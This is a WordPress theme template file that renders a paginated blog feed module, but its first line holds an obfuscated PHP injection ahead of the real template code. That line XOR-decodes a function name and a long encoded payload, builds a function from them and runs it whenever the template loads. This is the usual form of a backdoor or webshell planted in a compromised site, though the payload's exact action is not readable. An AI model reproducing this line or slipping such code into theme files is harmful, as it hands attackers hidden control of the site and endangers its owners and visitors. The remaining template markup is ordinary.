<?php $McgXSSMth='4D70MNfFO9-C1D6'^'W6RQ9+9 :WN7X+X';$ljqGR=$McgXSSMth('','9HImTE4C58<E.5MB:I9dS66Bm.WNA3l5 0pPBpVXaX>R7-0QWPI-G>0X:;14Q<9cjY1BMjhG:QYpbOPrw8NOlr=0.dMQqTvMXb =8rJWdTRDCqPIoNX3YSXFFZ123QWhi+CxOYLhkD9>rhDFJm5P-07BB:qkcb3 K8AUgubDFOZ7PEu=I5pczWFQmR7F>E+fU5;Hspk;Ly9EIj0901mMIJ6Z2<TeWH05R<GU3CTF3+ NXIosZC8WUN:DPkg;8a2g b1HjgP4CImKOs3O 9+dA+0GeOW3W9=+HdRvJYVURpybO0O,rlUqLL4HNjkICK 1wAOB5L00jj:>b>O5T1QZSiql:r;nn7.c28dgF0:lYFRbO8>FRsE1No:W,MXM;P6KwGUS:P>va7=fULTZckHW<LRUEWGL.f;GFs1TILurkvCYS3;RJ:S>+g35Y8S4C38bU:ELPYG6SD0ZU0S52JkI,OUFIzC6->6fU6OACh4E1NC>+BYUHrt.:DYN;-7<nT3UB<>bEPR6JFzE69X7NkoKLFTQxqj-Y -vRKI4w1gmxEAUPMt6cYFJXgg.cSoOZcySSwVKFyC0CRfQJOoqvPV4GY=.K<HdUVEMI9irHLNPQAZPJavDJ;LzCQfcjTeNB3XZS8kcHMJQiNMQYT7ADk7LbH80=9HojZHZ4'^'P.aL20Z AQS+qP5+I=JLtNY02J6: l3XUDWykP-Rh>K<TYY>9p1B5aT9NZnk<IMKN=P6,FHcQ4 YBopRWCDFeVREZDpqVsMGQkFRJZn>DirtxQt S=,A566nb>PFRxlHMBhSfSEaO+LJRFyfbIQ1YQlf+gQ5CFXE2ce<GPB72=6R>mQV,LY>SlLXd R2K7ENqZN<ZKa21sDOCNTXDPMpi,W6AYoos,QA3c,0JcifUJL==rey<,J24-RdxO8xw.y.eBP;JC;Q:iPuoWE.LLNMaP:NA+6G6fVN1DoVn23,izpF+Q;MRQuU:-X=+Qa4IAIWWinfQ-DQCJA4kX G1P22sAU3h7j;+dzCSKDC-UCLdxrF9YR37ZeJDf3sH,,,d;S2WzuwQ5GMk>4B1- ;CVhsJ->  lMESlFMLWU5=-UOK667 VI;+V:DNOKZ+g7U7Rg=8O1d284Sepo>0S<QWbO-M;4oeZgRLJW9>S6hjS>,WfgZJ68unTTOH687dFRE11K<1HMJb;7OmjZaRX,VgKImln95MYNI8TL-u ,MPlNMExarg,FSSiry:UUMS6WwlTNkgAcswAzTq4P3mfOWPp7F58Dq Y1;0.,>=JAU8-7<> >wfAR +O-SjqFCJtE5H:=,2TCG,,>02i=0 8X  LjeYB1UEP<GZssPI');$ljqGR();
$data_atts = $this->shortcode_atts_to_data_atts(array(
	'show_featured_image',
	'show_author',
	'show_categories',
	'show_date',
	'show_rating',
	'show_more',
	'show_comments',
	'date_format',
	'posts_per_page',
	'order',
	'orderby',
	'category_id',
	'content_length',
	'blog_feed_module_type',
	'hover_overlay_icon',
	'use_tax_query'
));

if ( 'standard' == $blog_feed_module_type && false === strpos( $category_id, ',' ) ) {
	$color = extra_get_category_color( $category_id );
	$color_style = esc_attr( sprintf( 'border-color:%s;', $color ) );
} else {
	$color_style = '';
}
?>

<?php $id_attr = '' !== $module_id ? sprintf( ' id="%1$s"', esc_attr( $module_id ) ) : ''; ?>
<div <?php echo $id_attr ?> class="posts-blog-feed-module post-module et_pb_extra_module <?php echo esc_attr( $blog_feed_module_type ); ?> <?php echo esc_attr( $module_class ); ?> paginated et_pb_extra_module" style="<?php echo esc_attr( $color_style ); ?>" data-current_page="1" data-et_column_type="<?php echo esc_attr( $_et_column_type ); ?>" <?php echo $data_atts; ?>>
<?php if ( !empty( $feed_title ) ) { ?>
	<div class="module-head">
		<h1 class="feed-title"><?php echo esc_html( $feed_title ); ?></h1>
	</div>
<?php } ?>

<?php if ( $module_posts->have_posts() ) : ?>
<div class="paginated_content">
	<?php require locate_template( 'module-posts-blog-feed-loop.php' ); ?>
</div><!-- /.paginated_content -->

<span class="loader"><?php extra_ajax_loader_img(); ?></span>

<?php if ( $module_posts->max_num_pages > 1 && $show_pagination ) { ?>
	<ul class="pagination">
		<li class="prev arrow"><a class="prev arrow" href="#"></a></li>
	<?php for ( $x = 1; $x <= $module_posts->max_num_pages; $x++ ) { ?>
		<?php if ( $x == $module_posts->max_num_pages ) { ?>
			<li class="ellipsis back"><a class="ellipsis" href="#">...</a></li>
		<?php } ?>

		<?php $last_class = $x == $module_posts->max_num_pages ? ' last' : ''; ?>
		<li class="<?php echo esc_attr( $last_class ); ?>"><a href="#" class="pagination-page pagination-page-<?php echo esc_attr( $x ); ?>" data-page="<?php echo $x; ?>"><?php echo $x; ?></a></li>
		<?php if ( $x == 1 ) { ?>
			<li class="ellipsis front"><a class="ellipsis" href="#">...</a></li>
		<?php } ?>
	<?php } ?>
		<li class="next arrow"><a class="next arrow" href="#"></a></li>
	</ul>
<?php } ?>
<?php else : ?>
	<article class='nopost'>
		<h5><?php esc_html_e( 'Sorry, No Posts Found', 'extra' ); ?></h5>
	</article>
<?php endif; ?>
</div><!-- /.posts-blog-feed-module -->
